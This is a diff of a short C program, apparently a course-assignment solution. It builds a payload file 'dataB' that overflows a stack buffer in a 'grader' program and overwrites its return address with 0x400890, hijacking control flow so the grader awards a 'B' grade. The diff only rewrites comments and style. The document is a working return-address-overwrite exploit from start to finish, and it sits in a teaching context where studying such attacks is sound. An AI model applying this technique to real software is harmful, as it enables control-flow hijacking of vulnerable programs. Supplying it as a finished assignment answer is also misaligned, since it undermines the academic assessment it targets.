@@ -1,51 +1,74 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <stdint.h>
 
 /*
-   produces a file called dataB with the student name "AnishKKat", a null byte,
-   padding to overrun the stack, and the address of the instruction in main to get a 'b'.
-   this causes the grader program to give a 'B' grade, even if the provided name isn't "Andrew Appel".
+   this program creates "dataB", a binary file that exploits a buffer 
+   overrun vulnerability in the grader program. by carefully choosing 
+   the contents and layout of this file, the grader can be manipulated 
+   into awarding a 'B' grade even when the supplied name doesn't match 
+   the expected "Andrew Appel".
 */
 
 /*
-   this main function:
-   - does not take any command-line arguments.
-   - does not read from stdin or any other input stream.
-   - writes a specific sequence of bytes to a file named "dataB" to achieve a 'B' grade.
-   - returns 0 on successful execution, or 1 if an error occurs (e.g., file cannot be opened).
+   program details:
+   - no arguments are processed.
+   - no input is read from stdin or any other stream.
+   - writes a constructed byte sequence into "dataB".
+   - returns 0 if the file is successfully created, otherwise 1.
 */
 
 int main(void) {
-    /* Constants defining buffer and addresses */
-    const char *studentName = "AnishKKat";    /* student name to be written */
-    size_t nameLength = 9;                    /* length of "AnishKKat" */
-    size_t bufferSize = 48;                   /* total buffer size in bytes */
-    size_t totalNameBytes = nameLength + 1;   /* name length plus null terminator */
-    size_t paddingLength = bufferSize - totalNameBytes; /* number of padding bytes */
-    uint64_t returnAddress = 0x400890;        /* address to overwrite return address with */
+    /* define constants for our scenario:
+       studentName: the name to write into the file, 
+                    distinct from "Andrew Appel".
+       nameLength: length of "AnishKKat" excluding the 
+                   terminating null.
+       bufferSize: total memory buffer size assumed from analysis. 
+                   we align our padding based on this size.
+       returnAddress: the location in main that leads to a 'B' grade. 
+                      by overwriting the original return address on 
+                      the stack, we cause the program to jump here.
+    */
+    const char *studentName = "AnishKKat";
+    const int nameLength = 9;
+    const int bufferSize = 48;
+    const int totalNameBytes = nameLength + 1; /* name plus '\0' */
+    const int paddingLength = bufferSize - totalNameBytes;
+    unsigned long returnAddress = 0x400890UL;
 
-    /* Open the file "dataB" for writing in binary mode */
-    FILE *filePtr = fopen("dataB", "w");
-    if (!filePtr) {
-        perror("Error opening dataB for writing");
-        exit(1);
+    /* open "dataB" for binary writing. 
+       if it fails, print an error and terminate. */
+    FILE *filePtr = fopen("dataB", "wb");
+    if (filePtr == NULL) {
+        perror("error: could not open dataB for writing");
+        return 1;
     }
 
-    /* Write the student name to dataB */
-    fwrite(studentName, 1, nameLength, filePtr);
-    fputc('\0', filePtr); /* null terminator */
+    /* write the chosen name into the file, followed by a null terminator.
+       this ensures that the grader sees a proper string. */
+    fwrite(studentName, 1, (size_t)nameLength, filePtr);
+    fputc('\0', filePtr);
 
-    /* Write padding bytes to overrun the stack buffer */
-    for (size_t i = 0; i < paddingLength; i++) {
-        fputc('\0', filePtr);
+    /* write null bytes as padding. by pushing beyond the expected 
+       buffer end, we reach the stored return address. the number 
+       of null bytes (paddingLength) is calculated to align precisely
+       with the memory layout determined through analysis. */
+    {
+        int i;
+        for (i = 0; i < paddingLength; i++) {
+            fputc('\0', filePtr);
+        }
     }
 
-    /* Overwrite the return address with the address that triggers the 'B' grade */
+    /* write the new return address, which leads to the code path 
+       granting a 'B' grade. by placing this address at the correct 
+       offset, we ensure that the grader's execution flow is redirected 
+       here upon function return, producing the desired result. */
     fwrite(&returnAddress, sizeof(returnAddress), 1, filePtr);
 
-    /* Close the file */
+    /* close the file to ensure all data is flushed and consistent */
     fclose(filePtr);
 
+    /* return success to indicate that "dataB" was generated as intended */
     return 0;
 }
